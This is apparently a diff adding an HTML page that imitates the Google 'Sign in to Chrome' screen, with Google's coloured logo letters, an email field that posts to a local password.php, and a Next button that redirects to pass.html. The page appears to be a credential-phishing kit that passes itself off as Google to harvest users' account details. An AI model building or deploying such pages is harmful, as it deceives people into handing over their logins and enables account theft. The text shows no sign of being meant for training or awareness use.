@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Google Chrome</title>
+   <style>
+ .container {
+        width: 400px; /* Adjust the width as needed */
+        height: 450px; /* Set a fixed height for the container */
+        padding: 20px; /* Add padding for space inside the container */
+        margin: 0 auto; /* Center the container */
+        border: 1px solid #ccc; /* Optional: border style */
+        border-radius: 8px; /* Optional: rounded corners */
+        background-color: #f9f9f9; /* Optional: background color */
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Optional: shadow for depth */
+        position: relative; /* Make it a positioning context for child elements */
+    }
+    input[type="email"], 
+    input[type="password"] {
+        width: 400px; /* Make the input take the full width of the container */
+        height: 55px; /* Set a specific height for the input box */
+        padding: 10px; /* Add padding inside the input for better usability */
+        margin-bottom: 10px; /* Space below the input */
+        border: 1px solid #ccc; /* Border style */
+        border-radius: 4px; /* Rounded corners for the input */
+    }
+    
+     .button-container {
+        display: flex; /* Use flexbox for alignment */
+        justify-content: space-between; /* Space between button and link */
+        align-items: center; /* Center vertically */
+        margin-top: -15px; /* Space above the button */
+    }
+     .forget-container {
+        display: flex; /* Use flexbox for alignment */
+        justify-content: space-between; /* Space between button and link */
+        align-items: center; /* Center vertically */
+        margin-top: -50px; /* Space above the button */
+    }
+     button {
+        width:17%;
+        position: absolute; /* Position it absolutely within the container */
+        bottom: 50px; /* Distance from the bottom */
+        right: 40px; /* Distance from the right */
+        padding: 10px 1px; /* Adjusted padding for a smaller button */
+        border: none; /* Remove border */
+        border-radius: 4px; /* Rounded corners for the button */
+        background-color: #4285F4; /* Button color */
+        color: white; /* Text color */
+        cursor: pointer; /* Pointer on hover */
+        font-size: 14px; /* Optional: adjust font size */
+    }
+    button:hover {
+        background-color: #357AE8; /* Darker shade on hover */
+    }
+    body {
+        font-family: Arial, sans-serif;
+    }
+</style>
+<style>
+    .google-logo {
+        display: flex; /* Aligns the letters in a row */
+        justify-content: center; /* Center the text */
+        font-size: 25px; /* Increase font size */
+        font-weight: lighter; /* Make the text bold */
+        margin-bottom: 20px; /* Space below the logo */
+         margin-top:20px;
+    }
+</style>
+<style>
+    .sign-in-text {
+        font-size: 24px; /* Increase the font size as needed */
+        font-weight: lighter; /* Make it bold */
+        margin: 10px 0; /* Add some margin for spacing */
+        text-align: center; /* Center the text */
+    }
+</style>
+
+</head>
+<body>
+        <!-- Google Logo -->
+       <div class="container">
+       <div class="google-logo">
+            <span style="color: #4285F4;">G</span>
+            <span style="color: #EA4335;">o</span>
+            <span style="color: #FBBC05;">o</span>
+            <span style="color: #4285F4;">g</span>
+            <span style="color: #34A853;">l</span>
+            <span style="color: #EA4335;">e</span>
+        </div>
+       <p class="sign-in-text">Sign in to Chrome</p>
+
+<p>Use your Google Account</p>
+    <form action="password.php" method="POST">
+        <input type="email" id="email" name="email" placeholder="Email or Phone" required>
+         <div class="button-container">
+            
+            <!-- <a href="create_account.php">Create account</a> -->
+            <button id="redirectButton">Next</button>
+        </div>
+    </form>
+    
+    <footer>
+         <div class="links">
+        <br><br>
+        <div class="forget-container">
+        <p><a href="#">Forgot email?</a></p>
+    </div>
+        <p>Not your computer? Use Guest mode to sign in privately</p>
+        <p><a href="#">Learn more about using Guest mode</a></p>
+        <p><a href="create_account.php">Create account</a></p>
+    </div>
+    </footer>
+</div>
+    <script src="script.js"></script>
+    <script>
+        document.getElementById('redirectButton').addEventListener('click', function() {
+            window.location.href = 'pass.html'; // Change to your desired URL
+        });
+    </script>
+</body>
+</html>
